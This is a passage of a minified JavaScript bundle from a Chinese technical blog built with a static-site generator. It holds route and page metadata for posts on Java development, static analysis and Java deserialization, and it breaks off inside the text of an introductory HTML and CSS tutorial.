springbootbase/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-1a3c5af6").then(t)}},{path:"/dev/java/core/springbootbase/index.html",redirect:"/dev/java/core/springbootbase/"},{path:"/01.开发/101.后端/1011.微服务核心/05.Springboot.html",redirect:"/dev/java/core/springbootbase/"},{name:"v-63e88fe4",path:"/dev/java/eco/docker/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-63e88fe4").then(t)}},{path:"/dev/java/eco/docker/index.html",redirect:"/dev/java/eco/docker/"},{path:"/01.开发/101.后端/1012.微服务生态/00.Docker.html",redirect:"/dev/java/eco/docker/"},{name:"v-7144078e",path:"/dev/java/eco/springsecurity/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-7144078e").then(t)}},{path:"/dev/java/eco/springsecurity/index.html",redirect:"/dev/java/eco/springsecurity/"},{path:"/01.开发/101.后端/1012.微服务生态/01.SpringSecurity.html",redirect:"/dev/java/eco/springsecurity/"},{name:"v-f9d6b4e4",path:"/dev/java/eco/shiro/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-f9d6b4e4").then(t)}},{path:"/dev/java/eco/shiro/index.html",redirect:"/dev/java/eco/shiro/"},{path:"/01.开发/101.后端/1012.微服务生态/02.Shiro.html",redirect:"/dev/java/eco/shiro/"},{name:"v-d37ff6a4",path:"/dev/java/project/cf/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-d37ff6a4").then(t)}},{path:"/dev/java/project/cf/index.html",redirect:"/dev/java/project/cf/"},{path:"/01.开发/101.后端/1013.项目实战/00.尚筹网.html",redirect:"/dev/java/project/cf/"},{name:"v-1713f0c0",path:"/dev/java/project/code/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-1713f0c0").then(t)}},{path:"/dev/java/project/code/index.html",redirect:"/dev/java/project/code/"},{path:"/01.开发/101.后端/1013.项目实战/01.代码片段.html",redirect:"/dev/java/project/code/"},{name:"v-2595496f",path:"/dev/basic/ds/introduction/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-2595496f").then(t)}},{path:"/dev/basic/ds/introduction/index.html",redirect:"/dev/basic/ds/introduction/"},{path:"/01.开发/102.计算机基础/1020.数据结构与算法/00.概述.html",redirect:"/dev/basic/ds/introduction/"},{name:"v-16c92313",path:"/dev/basic/ds/list/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-16c92313").then(t)}},{path:"/dev/basic/ds/list/index.html",redirect:"/dev/basic/ds/list/"},{path:"/01.开发/102.计算机基础/1020.数据结构与算法/01.线性表.html",redirect:"/dev/basic/ds/list/"},{name:"v-31806689",path:"/dev/basic/network/introduction/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-31806689").then(t)}},{path:"/dev/basic/network/introduction/index.html",redirect:"/dev/basic/network/introduction/"},{path:"/01.开发/102.计算机基础/1021.计算机网络/00.概述.html",redirect:"/dev/basic/network/introduction/"},{name:"v-60fcebe2",path:"/dev/basic/network/physicallayer/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-60fcebe2").then(t)}},{path:"/dev/basic/network/physicallayer/index.html",redirect:"/dev/basic/network/physicallayer/"},{path:"/01.开发/102.计算机基础/1021.计算机网络/01.物理层.html",redirect:"/dev/basic/network/physicallayer/"},{name:"v-bfe23564",path:"/navigation/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-bfe23564").then(t)}},{path:"/navigation/index.html",redirect:"/navigation/"},{path:"/01.站点导航.html",redirect:"/navigation/"},{name:"v-290ff5e0",path:"/sec/sa/nju/introduction/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-290ff5e0").then(t)}},{path:"/sec/sa/nju/introduction/index.html",redirect:"/sec/sa/nju/introduction/"},{path:"/02.安全/200.静态分析/2000.南京大学课程笔记/00.Introduction.html",redirect:"/sec/sa/nju/introduction/"},{name:"v-cba31118",path:"/sec/sa/nju/ir/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-cba31118").then(t)}},{path:"/sec/sa/nju/ir/index.html",redirect:"/sec/sa/nju/ir/"},{path:"/02.安全/200.静态分析/2000.南京大学课程笔记/01.IR.html",redirect:"/sec/sa/nju/ir/"},{name:"v-73ef1b26",path:"/sec/sa/nju/dfaapplications/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-73ef1b26").then(t)}},{path:"/sec/sa/nju/dfaapplications/index.html",redirect:"/sec/sa/nju/dfaapplications/"},{path:"/02.安全/200.静态分析/2000.南京大学课程笔记/02.DFA-Applications.html",redirect:"/sec/sa/nju/dfaapplications/"},{name:"v-70906098",path:"/sec/sa/nju/dfafoundations/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-70906098").then(t)}},{path:"/sec/sa/nju/dfafoundations/index.html",redirect:"/sec/sa/nju/dfafoundations/"},{path:"/02.安全/200.静态分析/2000.南京大学课程笔记/03.DFA-Foundations.html",redirect:"/sec/sa/nju/dfafoundations/"},{name:"v-34d8b340",path:"/sec/sa/codeql/uboot1/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-34d8b340").then(t)}},{path:"/sec/sa/codeql/uboot1/index.html",redirect:"/sec/sa/codeql/uboot1/"},{path:"/02.安全/200.静态分析/2001.CodeQL/00. CodeQL - UBoot练习项目（上）.html",redirect:"/sec/sa/codeql/uboot1/"},{name:"v-5155b7a4",path:"/sec/sa/codeql/uboot2/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-5155b7a4").then(t)}},{path:"/sec/sa/codeql/uboot2/index.html",redirect:"/sec/sa/codeql/uboot2/"},{path:"/02.安全/200.静态分析/2001.CodeQL/01. CodeQL - UBoot练习项目（下）.html",redirect:"/sec/sa/codeql/uboot2/"},{name:"v-5dd47d80",path:"/sec/sa/codeql/codeqlstep0to1/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-5dd47d80").then(t)}},{path:"/sec/sa/codeql/codeqlstep0to1/index.html",redirect:"/sec/sa/codeql/codeqlstep0to1/"},{path:"/02.安全/200.静态分析/2001.CodeQL/02. CodeQL从入门到放弃.html",redirect:"/sec/sa/codeql/codeqlstep0to1/"},{name:"v-0866a376",path:"/sec/vuln/deserialization/reflaction/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-0866a376").then(t)}},{path:"/sec/vuln/deserialization/reflaction/index.html",redirect:"/sec/vuln/deserialization/reflaction/"},{path:"/02.安全/201.漏洞原理/2010.反序列化漏洞/00.反序列化原理-反射.html",redirect:"/sec/vuln/deserialization/reflaction/"},{name:"v-376db697",path:"/sec/vuln/deserialization/urldns/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-376db697").then(t)}},{path:"/sec/vuln/deserialization/urldns/index.html",redirect:"/sec/vuln/deserialization/urldns/"},{path:"/02.安全/201.漏洞原理/2010.反序列化漏洞/01.URLDNS分析.html",redirect:"/sec/vuln/deserialization/urldns/"},{name:"v-2a89f0a5",path:"/sec/vuln/deserialization/cc1/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-2a89f0a5").then(t)}},{path:"/sec/vuln/deserialization/cc1/index.html",redirect:"/sec/vuln/deserialization/cc1/"},{path:"/02.安全/201.漏洞原理/2010.反序列化漏洞/02.CC1分析.html",redirect:"/sec/vuln/deserialization/cc1/"},{name:"v-0c9de936",path:"/sec/vuln/deserialization/cc6/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-0c9de936").then(t)}},{path:"/sec/vuln/deserialization/cc6/index.html",redirect:"/sec/vuln/deserialization/cc6/"},{path:"/02.安全/201.漏洞原理/2010.反序列化漏洞/03.CC6分析.html",redirect:"/sec/vuln/deserialization/cc6/"},{name:"v-47cbce6b",path:"/sec/vuln/deserialization/serialization/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-47cbce6b").then(t)}},{path:"/sec/vuln/deserialization/serialization/index.html",redirect:"/sec/vuln/deserialization/serialization/"},{path:"/02.安全/201.漏洞原理/2010.反序列化漏洞/04.反序列化原理-反序列化.html",redirect:"/sec/vuln/deserialization/serialization/"},{name:"v-56606b1e",path:"/sec/dev/python/pystring/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-56606b1e").then(t)}},{path:"/sec/dev/python/pystring/index.html",redirect:"/sec/dev/python/pystring/"},{path:"/02.安全/202.安全开发/2020.Python/00.Python字符串的那些事.html",redirect:"/sec/dev/python/pystring/"},{name:"v-711274d8",path:"/sec/dev/python/sequence/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-711274d8").then(t)}},{path:"/sec/dev/python/sequence/index.html",redirect:"/sec/dev/python/sequence/"},{path:"/02.安全/202.安全开发/2020.Python/01.Python序列的那些事.html",redirect:"/sec/dev/python/sequence/"},{name:"v-a9def288",path:"/sec/dev/python/process/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-a9def288").then(t)}},{path:"/sec/dev/python/process/index.html",redirect:"/sec/dev/python/process/"},{path:"/02.安全/202.安全开发/2020.Python/02.Python流程控制的那些事.html",redirect:"/sec/dev/python/process/"},{name:"v-bca2559e",path:"/sec/dev/python/func/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-bca2559e").then(t)}},{path:"/sec/dev/python/func/index.html",redirect:"/sec/dev/python/func/"},{path:"/02.安全/202.安全开发/2020.Python/03.Python函数的小秘密.html",redirect:"/sec/dev/python/func/"},{name:"v-40cc2fb1",path:"/sec/dev/python/oop/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-40cc2fb1").then(t)}},{path:"/sec/dev/python/oop/index.html",redirect:"/sec/dev/python/oop/"},{path:"/02.安全/202.安全开发/2020.Python/04.Python面向对象的那些事.html",redirect:"/sec/dev/python/oop/"},{name:"v-2968b3d4",path:"/sec/dev/python/exception/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-2968b3d4").then(t)}},{path:"/sec/dev/python/exception/index.html",redirect:"/sec/dev/python/exception/"},{path:"/02.安全/202.安全开发/2020.Python/05.Python异常处理的那些事.html",redirect:"/sec/dev/python/exception/"},{name:"v-eadc1a9a",path:"/sec/dev/python/file/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-eadc1a9a").then(t)}},{path:"/sec/dev/python/file/index.html",redirect:"/sec/dev/python/file/"},{path:"/02.安全/202.安全开发/2020.Python/06.Python文件操作的那些事.html",redirect:"/sec/dev/python/file/"},{name:"v-aee8137e",path:"/sec/dev/python/module/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-aee8137e").then(t)}},{path:"/sec/dev/python/module/index.html",redirect:"/sec/dev/python/module/"},{path:"/02.安全/202.安全开发/2020.Python/07.Python模块化的那些事.html",redirect:"/sec/dev/python/module/"},{name:"v-3f2c56fd",path:"/sec/dev/python/thread/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-3f2c56fd").then(t)}},{path:"/sec/dev/python/thread/index.html",redirect:"/sec/dev/python/thread/"},{path:"/02.安全/202.安全开发/2020.Python/08.Python多线程的那些事.html",redirect:"/sec/dev/python/thread/"},{name:"v-556cb44a",path:"/sec/dev/go/basicgrammar/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-556cb44a").then(t)}},{path:"/sec/dev/go/basicgrammar/index.html",redirect:"/sec/dev/go/basicgrammar/"},{path:"/02.安全/202.安全开发/2021.Go/00.Go语言基础语法.html",redirect:"/sec/dev/go/basicgrammar/"},{name:"v-4077a5fe",path:"/sec/skill/jar2app/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-4077a5fe").then(t)}},{path:"/sec/skill/jar2app/index.html",redirect:"/sec/skill/jar2app/"},{path:"/02.安全/203.奇淫巧技/2030.小工具/00.jar打包为app.html",redirect:"/sec/skill/jar2app/"},{name:"v-880aa198",path:"/sec/skill/picocli-quick-start/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-880aa198").then(t)}},{path:"/sec/skill/picocli-quick-start/index.html",redirect:"/sec/skill/picocli-quick-start/"},{path:"/02.安全/203.奇淫巧技/2030.小工具/01.picocli.html",redirect:"/sec/skill/picocli-quick-start/"},{name:"v-49770e72",path:"/sec/codereview/javachecklist/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-49770e72").then(t)}},{path:"/sec/codereview/javachecklist/index.html",redirect:"/sec/codereview/javachecklist/"},{path:"/02.安全/204.代码审计/00.Java代码审计CheckList.html",redirect:"/sec/codereview/javachecklist/"},{name:"v-1a41a8d0",path:"/life/other/airconditioning/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-1a41a8d0").then(t)}},{path:"/life/other/airconditioning/index.html",redirect:"/life/other/airconditioning/"},{path:"/03.生活/300.其他/01.天气炎热开个空调吧.html",redirect:"/life/other/airconditioning/"},{name:"v-3553020e",path:"/more/blog/emoji/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-3553020e").then(t)}},{path:"/more/blog/emoji/index.html",redirect:"/more/blog/emoji/"},{path:"/04.更多/400.博客搭建/00.emoji.html",redirect:"/more/blog/emoji/"},{name:"v-a67c2976",path:"/more/blog/privatepage/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-a67c2976").then(t)}},{path:"/more/blog/privatepage/index.html",redirect:"/more/blog/privatepage/"},{path:"/04.更多/400.博客搭建/01.私密文章测试.html",redirect:"/more/blog/privatepage/"},{name:"v-2555ef69",path:"/about/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-2555ef69").then(t)}},{path:"/about/index.html",redirect:"/about/"},{path:"/05.关于/01.关于.html",redirect:"/about/"},{name:"v-3b782278",path:"/private/login/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-3b782278").then(t)}},{path:"/private/login/index.html",redirect:"/private/login/"},{path:"/99.私密文章登录.html",redirect:"/private/login/"},{name:"v-4e7874b6",path:"/archives/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-4e7874b6").then(t)}},{path:"/archives/index.html",redirect:"/archives/"},{path:"/@pages/archivesPage.html",redirect:"/archives/"},{name:"v-0cedb105",path:"/categories/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-0cedb105").then(t)}},{path:"/categories/index.html",redirect:"/categories/"},{path:"/@pages/categoriesPage.html",redirect:"/categories/"},{name:"v-40954b25",path:"/tags/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-40954b25").then(t)}},{path:"/tags/index.html",redirect:"/tags/"},{path:"/@pages/tagsPage.html",redirect:"/tags/"},{name:"v-fd425884",path:"/",component:vl,beforeEnter:(n,e,t)=>{ps("Layout","v-fd425884").then(t)}},{path:"/index.html",redirect:"/"},{path:"*",component:vl}],xl={title:"",description:"",base:"/",headTags:[],pages:[{title:"开发",frontmatter:{pageComponent:{name:"Catalogue",data:{path:"01.开发",description:"有关前后端开发的相关技术。"}},title:"开发",date:"2021-10-21T16:43:47.000Z",permalink:"/dev/",sidebar:!1,article:!1,comment:!1,editLink:!1,readingShow:"top"},regularPath:"/00.%E7%9B%AE%E5%BD%95%E9%A1%B5/00.%E5%AF%BC%E8%88%AA%E6%A0%8F/01.%E5%BC%80%E5%8F%91.html",relativePath:"00.目录页/00.导航栏/01.开发.md",key:"v-f6da7732",path:"/dev/",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2022/05/06, 15:57:40",lastUpdatedTimestamp:165185266e4},{title:"安全",frontmatter:{pageComponent:{name:"Catalogue",data:{path:"02.安全",description:"渗透测试、代码审计相关的知识总结。"}},title:"安全",date:"2021-10-21T16:43:47.000Z",permalink:"/sec/",sidebar:!1,article:!1,comment:!1,editLink:!1,readingShow:"top"},regularPath:"/00.%E7%9B%AE%E5%BD%95%E9%A1%B5/00.%E5%AF%BC%E8%88%AA%E6%A0%8F/02.%E5%AE%89%E5%85%A8.html",relativePath:"00.目录页/00.导航栏/02.安全.md",key:"v-4b18908b",path:"/sec/",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2022/05/06, 15:57:40",lastUpdatedTimestamp:165185266e4},{title:"生活",frontmatter:{pageComponent:{name:"Catalogue",data:{path:"03.生活",description:"闲来无事、写点什么。"}},title:"生活",date:"2021-10-21T16:43:47.000Z",permalink:"/life/",sidebar:!1,article:!1,comment:!1,editLink:!1,readingShow:"top"},regularPath:"/00.%E7%9B%AE%E5%BD%95%E9%A1%B5/00.%E5%AF%BC%E8%88%AA%E6%A0%8F/03.%E7%94%9F%E6%B4%BB.html",relativePath:"00.目录页/00.导航栏/03.生活.md",key:"v-3acc97ec",path:"/life/",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2022/05/06, 15:57:40",lastUpdatedTimestamp:165185266e4},{title:"更多",frontmatter:{pageComponent:{name:"Catalogue",data:{path:"04.更多",description:"其他一些未归档的内容暂存此处。"}},title:"更多",date:"2021-10-21T16:43:47.000Z",permalink:"/more/",sidebar:!1,article:!1,comment:!1,editLink:!1,readingShow:"top"},regularPath:"/00.%E7%9B%AE%E5%BD%95%E9%A1%B5/00.%E5%AF%BC%E8%88%AA%E6%A0%8F/04.%E6%9B%B4%E5%A4%9A.html",relativePath:"00.目录页/00.导航栏/04.更多.md",key:"v-572c22a4",path:"/more/",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2022/05/06, 15:57:40",lastUpdatedTimestamp:165185266e4},{title:"前端",frontmatter:{pageComponent:{name:"Catalogue",data:{path:"01.开发/100.前端",description:"前端开发相关技术总结。"}},title:"前端",date:"2022-01-16T17:47:41.000Z",permalink:"/dev/web/",sidebar:!1,article:!1,comment:!1,editLink:!1,readingShow:"top"},regularPath:"/00.%E7%9B%AE%E5%BD%95%E9%A1%B5/01.%E5%BC%80%E5%8F%91/00.%E5%89%8D%E7%AB%AF.html",relativePath:"00.目录页/01.开发/00.前端.md",key:"v-c09a6976",path:"/dev/web/",headersStr:null,content:"笔记\n\n等待学习和补充。",normalizedContent:"笔记\n\n等待学习和补充。",charsets:{cjk:!0},lastUpdated:"2022/05/14, 03:12:10",lastUpdatedTimestamp:165249793e4},{title:"后端",frontmatter:{pageComponent:{name:"Catalogue",data:{path:"01.开发/101.后端",description:"Java后端开发笔记。"}},title:"后端",date:"2022-01-16T17:47:41.000Z",permalink:"/dev/java/",sidebar:!1,article:!1,comment:!1,editLink:!1,readingShow:"top"},regularPath:"/00.%E7%9B%AE%E5%BD%95%E9%A1%B5/01.%E5%BC%80%E5%8F%91/01.%E5%90%8E%E7%AB%AF.html",relativePath:"00.目录页/01.开发/01.后端.md",key:"v-667b11b3",path:"/dev/java/",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2022/05/06, 15:57:40",lastUpdatedTimestamp:165185266e4},{title:"计算机基础",frontmatter:{pageComponent:{name:"Catalogue",data:{path:"01.开发/102.计算机基础",description:"计算机科学与技术专业基础知识。"}},title:"计算机基础",date:"2022-01-16T17:47:41.000Z",permalink:"/dev/basic/",sidebar:!1,article:!1,comment:!1,editLink:!1,readingShow:"top"},regularPath:"/00.%E7%9B%AE%E5%BD%95%E9%A1%B5/01.%E5%BC%80%E5%8F%91/02.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80.html",relativePath:"00.目录页/01.开发/02.计算机基础.md",key:"v-637ee5a8",path:"/dev/basic/",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2022/05/06, 15:57:40",lastUpdatedTimestamp:165185266e4},{title:"静态分析",frontmatter:{pageComponent:{name:"Catalogue",data:{path:"02.安全/200.静态分析",description:"程序分析概念和知识。"}},title:"静态分析",date:"2022-01-16T17:47:41.000Z",permalink:"/sec/sa/",sidebar:!1,article:!1,comment:!1,editLink:!1,readingShow:"top"},regularPath:"/00.%E7%9B%AE%E5%BD%95%E9%A1%B5/02.%E5%AE%89%E5%85%A8/00.%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90.html",relativePath:"00.目录页/02.安全/00.静态分析.md",key:"v-20ccf4ba",path:"/sec/sa/",headersStr:null,content:"笔记\n\n等待学习和补充。",normalizedContent:"笔记\n\n等待学习和补充。",charsets:{cjk:!0},lastUpdated:"2022/05/14, 03:12:10",lastUpdatedTimestamp:165249793e4},{title:"漏洞原理",frontmatter:{pageComponent:{name:"Catalogue",data:{path:"02.安全/201.漏洞原理",description:"常见通用漏洞的原理分析。"}},title:"漏洞原理",date:"2022-01-16T17:47:41.000Z",permalink:"/sec/vuln/",sidebar:!1,article:!1,comment:!1,editLink:!1,readingShow:"top"},regularPath:"/00.%E7%9B%AE%E5%BD%95%E9%A1%B5/02.%E5%AE%89%E5%85%A8/01.%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86.html",relativePath:"00.目录页/02.安全/01.漏洞原理.md",key:"v-0767abfc",path:"/sec/vuln/",headersStr:null,content:"笔记\n\n等待学习和补充。",normalizedContent:"笔记\n\n等待学习和补充。",charsets:{cjk:!0},lastUpdated:"2022/05/14, 03:12:10",lastUpdatedTimestamp:165249793e4},{title:"安全开发",frontmatter:{pageComponent:{name:"Catalogue",data:{path:"02.安全/202.安全开发",description:"安全相关的工具开发和利用。"}},title:"安全开发",date:"2022-01-16T17:47:41.000Z",permalink:"/sec/dev/",sidebar:!1,article:!1,comment:!1,editLink:!1,readingShow:"top"},regularPath:"/00.%E7%9B%AE%E5%BD%95%E9%A1%B5/02.%E5%AE%89%E5%85%A8/02.%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91.html",relativePath:"00.目录页/02.安全/02.安全开发.md",key:"v-284a5c70",path:"/sec/dev/",headersStr:null,content:"笔记\n\n等待学习和补充。",normalizedContent:"笔记\n\n等待学习和补充。",charsets:{cjk:!0},lastUpdated:"2022/05/14, 03:12:10",lastUpdatedTimestamp:165249793e4},{title:"奇淫巧技",frontmatter:{pageComponent:{name:"Catalogue",data:{path:"02.安全/203.奇淫巧技",description:"安全相关的骚操作。"}},title:"奇淫巧技",date:"2022-01-16T17:47:41.000Z",permalink:"/sec/skill/",sidebar:!1,article:!1,comment:!1,editLink:!1,readingShow:"top"},regularPath:"/00.%E7%9B%AE%E5%BD%95%E9%A1%B5/02.%E5%AE%89%E5%85%A8/03.%E5%A5%87%E6%B7%AB%E5%B7%A7%E6%8A%80.html",relativePath:"00.目录页/02.安全/03.奇淫巧技.md",key:"v-f5009938",path:"/sec/skill/",headersStr:null,content:"笔记\n\n等待学习和补充。",normalizedContent:"笔记\n\n等待学习和补充。",charsets:{cjk:!0},lastUpdated:"2022/05/14, 03:12:10",lastUpdatedTimestamp:165249793e4},{title:"博客搭建",frontmatter:{pageComponent:{name:"Catalogue",data:{path:"04.更多/400.博客搭建",description:"搭建博客的记录。"}},title:"博客搭建",date:"2022-01-16T17:47:41.000Z",permalink:"/more/blog/",sidebar:!1,article:!1,comment:!1,editLink:!1,readingShow:"top"},regularPath:"/00.%E7%9B%AE%E5%BD%95%E9%A1%B5/04.%E6%9B%B4%E5%A4%9A/00.%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA.html",relativePath:"00.目录页/04.更多/00.博客搭建.md",key:"v-9567367a",path:"/more/blog/",headersStr:null,content:"笔记\n\n等待学习和补充。",normalizedContent:"笔记\n\n等待学习和补充。",charsets:{cjk:!0},lastUpdated:"2022/05/14, 03:12:10",lastUpdatedTimestamp:165249793e4},{title:"HTML&CSS基础",frontmatter:{title:"HTML&CSS基础",date:"2022-03-04T00:00:00.000Z",permalink:"/dev/web/basis/htmlandcss",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","前端","前端基础"],tags:["HTML","CSS"],private:!0,readingShow:"top"},regularPath:"/01.%E5%BC%80%E5%8F%91/100.%E5%89%8D%E7%AB%AF/1000.%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/00.%20HTML&CSS%E5%9F%BA%E7%A1%80.html",relativePath:"01.开发/100.前端/1000.前端基础/00. HTML&CSS基础.md",key:"v-236f9bdc",path:"/dev/web/basis/htmlandcss/",headers:[{level:2,title:"HTML 标签",slug:"html-标签",normalizedTitle:"html 标签",charIndex:20},{level:3,title:"实体",slug:"实体",normalizedTitle:"实体",charIndex:32},{level:3,title:"Meta标签",slug:"meta标签",normalizedTitle:"meta标签",charIndex:231},{level:3,title:"语义化标签",slug:"语义化标签",normalizedTitle:"语义化标签",charIndex:1560},{level:3,title:"列表",slug:"列表",normalizedTitle:"列表",charIndex:3205},{level:3,title:"超链接",slug:"超链接",normalizedTitle:"超链接",charIndex:866},{level:3,title:"图片标签",slug:"图片标签",normalizedTitle:"图片标签",charIndex:3978},{level:3,title:"内联框架",slug:"内联框架",normalizedTitle:"内联框架",charIndex:4506},{level:3,title:"多媒体",slug:"多媒体",normalizedTitle:"多媒体",charIndex:4690},{level:3,title:"表格",slug:"表格",normalizedTitle:"表格",charIndex:5505},{level:3,title:"表单",slug:"表单",normalizedTitle:"表单",charIndex:5512},{level:2,title:"CSS样式",slug:"css样式",normalizedTitle:"css样式",charIndex:5519},{level:3,title:"CSS简介",slug:"css简介",normalizedTitle:"css简介",charIndex:5529},{level:3,title:"CSS基本语法",slug:"css基本语法",normalizedTitle:"css基本语法",charIndex:6585},{level:3,title:"CSS选择器",slug:"css选择器",normalizedTitle:"css选择器",charIndex:6854},{level:3,title:"单位",slug:"单位",normalizedTitle:"单位",charIndex:4215},{level:3,title:"颜色",slug:"颜色",normalizedTitle:"颜色",charIndex:9190},{level:3,title:"布局",slug:"布局",normalizedTitle:"布局",charIndex:2749},{level:3,title:"浮动",slug:"浮动",normalizedTitle:"浮动",charIndex:15814},{level:3,title:"定位",slug:"定位",normalizedTitle:"定位",charIndex:3906},{level:3,title:"字体和背景",slug:"字体和背景",normalizedTitle:"字体和背景",charIndex:26392},{level:3,title:"动画",slug:"动画",normalizedTitle:"动画",charIndex:31681},{level:3,title:"响应式布局",slug:"响应式布局",normalizedTitle:"响应式布局",charIndex:31688},{level:2,title:"练习",slug:"练习",normalizedTitle:"练习",charIndex:31698}],headersStr:"HTML 标签 实体 Meta标签 语义化标签 列表 超链接 图片标签 内联框架 多媒体 表格 表单 CSS样式 CSS简介 CSS基本语法 CSS选择器 单位 颜色 布局 浮动 定位 字体和背景 动画 响应式布局 练习",content:'# HTML & CSS 基础\n\n\n# HTML 标签\n\n\n# 实体\n\n如果我们在网页中编写的多个空格，默认情况会自动被浏览器解析为一个空格。另外在HTML中有些时候，我们不能直接书写一些特殊符号。比如：多个连续的空格，比如字母两侧的大于和小于号。如果我们需要在网页中书写这些特殊的符号，则需要使用html中的实体（转义字符）：\n\n&实体的名字;\n&nbsp; 空格\n&gt; 大于号\n&lt; 小于号\n&copy; 版权符号\n\n\n1\n2\n3\n4\n5\n\n\n\n# Meta标签\n\nmeta主要用于设置网页中的一些元数据，元数据不是给用户看\n\n * charset 指定网页的字符集\n * name 指定的数据的名称\n * content 指定的数据的内容\n * keywords 表示网站的关键字，可以同时指定多个关键字，关键字间使用,隔开\n\nmeta主要用于设置网页中的一些元数据，元数据不是给用户看\ncharset 指定网页的字符集\nname 指定的数据的名称\ncontent 指定的数据的内容\n\nkeywords 表示网站的关键字，可以同时指定多个关键字，关键字间使用,隔开\n<meta name="Keywords" content="网上购物,网上商城,手机,笔记本,电脑,MP3,CD,VCD,DV,相机,数码,配件,手表,存储卡,京东"/>\n<meta name="keywords" content="网购,网上购物,在线购物,网购网站,网购商城,购物网站,网购中心,购物中心,卓越,亚马逊,卓越亚马逊,亚马逊中国,joyo,amazon">\n\ndescription 用于指定网站的描述\n<meta name="description" content="京东JD.COM-专业的综合网上购物商城,销售家电、数码通讯、电脑、家居百货、服装服饰、母婴、图书、食品等数万个品牌优质商品.便捷、诚信的服务，为您提供愉悦的网上购物体验!"/>\n网站的描述会显示在搜索引擎的搜索的结果中\n\ntitle标签的内容会作为搜索结果的超链接上的文字显示\n\n<meta name="keywords" content="网购,网上购物,在线购物,网购网站,网购商城,购物网站,网购中心,购物中心,卓越,亚马逊,卓越亚马逊,亚马逊中国,joyo,amazon">\n\ndescription 用于指定网站的描述\n网站的描述会显示在搜索引擎的搜索的结果中\ntitle标签的内容会作为搜索结果的超链接上的文字显示\n\n<meta name="description" content="京东JD.COM-专业的综合网上购物商城,销售家电、数码通讯、电脑、家居百货、服装服饰、母婴、图书、食品等数万个品牌优质商品.便捷、诚信的服务，为您提供愉悦的网上购物体验!"/>\n\n--\x3e\n<meta name="keywords" content="HTML5,前端,CSS3">\n<meta name="description" content="这是一个非常不错的网站">\n\x3c!--\n<meta http-equiv="refresh" content="3;url=https://www.mozilla.org"> \n将页面重定向到另一个网站\n--\x3e\n\x3c!-- <meta http-equiv="refresh" content="3;url=https://www.baidu.com"> --\x3e\n<title>Document</title>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# 语义化标签\n\n在网页中HTML专门用来负责网页的结构，所以在使用html标签时，应该关注的是标签的语义，而不是它的样式。\n\n# 标题\n\n * h1 ~ h6 一共有六级标题\n\n * 从h1~h6重要性递减，h1最重要，h6最不重要\n   \n     -         h1在网页中的重要性仅次于title标签，一般情况下一个页面中只会有一个h1\n     -          一般情况下标题标签只会使用到h1~h3，h4~h6很少用\n     -         标题标签都是块元素\n     -          在页面中独占一行的元素称为块元素（block element）\n   \n\n<h1>一级标题</h1>\n<h2>二级标题</h2>\n<h3>三级标题</h3>\n<h4>四级标题</h4>\n<h5>五级标题</h5>\n<h6>六级标题</h6>\n\n\x3c!-- \nhgroup标签用来为标题分组，可以将一组相关的标题同时放入到hgroup\n\n--\x3e\n<hgroup>\n  <h1>回乡偶书二首</h1>\n  